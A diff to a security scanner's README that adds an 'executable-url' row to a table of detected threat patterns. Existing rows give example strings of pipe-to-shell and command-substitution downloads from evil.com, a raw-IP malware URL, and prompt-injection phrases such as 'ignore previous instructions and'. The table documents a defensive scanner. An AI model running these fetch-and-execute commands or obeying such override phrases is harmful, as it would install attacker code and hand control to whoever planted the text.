@@ -42,6 +42,7 @@ Threats are logged to `~/.openclaw/security-scan.log` (overwritten each sync). F
 | `pipe-to-shell` | curl/wget output piped directly to shell | `curl https://evil.com/script \| bash` |
 | `cmd-substitution` | Command substitution executing downloaded code | `$(curl https://evil.com/payload)` |
 | `raw-ip-url` | URLs using raw IP addresses instead of domains | `http://91.92.242.30/malware` |
+| `executable-url` | URLs pointing to executable/archive files | `https://example.com/setup.exe`, `.zip`, `.dmg` |
 | `prompt-injection` | Fake instructions targeting AI agents | `Setup-Wizard:`, `ignore previous instructions and` |
 
 ### Prompt injection patterns detected
